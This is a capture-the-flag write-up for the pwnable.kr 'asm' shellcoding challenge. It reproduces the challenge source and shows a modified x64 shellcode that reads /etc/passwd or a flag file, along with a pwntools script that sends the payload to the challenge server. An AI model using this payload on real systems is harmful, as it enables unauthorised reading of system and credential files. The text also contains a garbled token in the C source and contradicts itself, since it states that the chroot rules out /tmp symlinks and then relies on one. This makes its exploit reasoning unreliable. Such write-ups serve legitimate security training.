# bof

## Description

asm - 6 pt

> Mommy! I think I know how to make shellcodes <br>
> ssh asm@pwnable.kr -p2222 (pw: guest)

## Solution

### Background

#### Shellcodes

A shellcode is a set of instructions that can be executed by the processor. Shellcodes are often injected into a program to execute arbitrary code, such as opening a shell or reading a file. Most of times, the injection is done using a buffer overflow, and the execution of the shellcode is done by jumping to the address of the injectioned code.

#### System calls

A syscall is a way for a program to interact with the operating system, and request a service. For example, the syscall `open` will open a file, and the syscall `read` will read the content of a file. 

Syscalls are done by interrupting the processor, and passing control the kernel. The kernel will then execute the syscall, and return the result to the program. 

In practice, the program will call `int` with the right interrupt nubmer - so the interrupt handler will be the kernel. Also, the program will pass the syscall number in the `eax` register, and the arguments in the other registers. The kernel will then execute the syscall, and return the result in the `eax` register.

#### seccomp

Seccomp is a Linux kernel feature that allows to restrict the syscalls that a program can use. It is often used to prevent a program from executing arbitrary code, by only allowing a limited set of syscalls.

### Exploit

Logging into the server, we get the following files:

```bash
-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm
-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c
-rw-r--r-- 1 root root   211 Nov 19  2016 readme
-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

The `asm.c` file contains the source code of the program, the `readme` file tells us the program runs with the right permissions on port `9026`, and the very long file is only there to inicate the name of the flag file.

Let's take a look at the source code:

```c

#define LENGTH 128

void sandbox(){
	scmp_		_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

It looks like the program takes a shellcode as input, and executes it. However, the a seccomp filter is applied, and the program is only allowed to use the syscalls `open`, `read`, `write`, `exit` and `exit_group`.

Also, the program uses `chroot` to run in `/home/asm_pwn`, so we can't use symlinks in `/tmp`.

Our goal is fairly simple: we need to make a shellcode that will open the flag file, read it, and print it to the screen using the `open`, `read` and `write` syscalls.

We can either write our own shellcode, or simply look one up online. The website [shell-storm](http://shell-storm.org/shellcode/) is a good place to look for shellcodes, and it seems like [this](https://shell-storm.org/shellcode/files/shellcode-878.html) `/etc/passwd` reader is a good starting point.

Here are the instructions:

```asm
_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdA"
```

And this is the actual shellcode:
```
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
```

As we've already stated, the above shellcode reads the `/etc/passwd` file. We need to modify it to read the flag file instead.

Before doing that, there are 2 observations we need to make here:

* the path of the file read by the shellcode is stored in the very last bytes, and is terminated by the `A` character - to avoid a null byte.

* the program `xor`s the last byte of the path with `0x41` - to avoid a null byte, and so if we change the length of the path, we need to change the offset of the `xor` instruction accordingly.

Having that in mind, a quick modification of the shellcode is to change the path to `/tmp/a/flag`. The length of this new path is the same as `/etc/passwd`, so we don't need to change the offset of the `xor` instruction:

```
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x74\x6D\x70\x2F\x61\x2F\x66\x6C\x61\x67\x41
```

By creating a symlink in `/tmp/a` to the flag file, we can read the flag file using the modified shellcode.

And so, the final exploit is:

```python
from pwn import *

# create a symlink in /tmp
ssh = ssh('asm', 'pwnable.kr', port=2222, password='guest')

ssh.mkdir('/tmp/a')
SSHPath('/tmp/a/flag', ssh=ssh).symlink_to('/home/asm_pwn/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

# connect to the server and send the shellcode
con = remote('pwnable.kr', 9026)

con.sendline('\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x74\x6D\x70\x2F\x61\x2F\x66\x6C\x61\x67\x41')

con.interactive()
```

```
Mak1ng_shelLcodE_i5_veRy_eaSy
```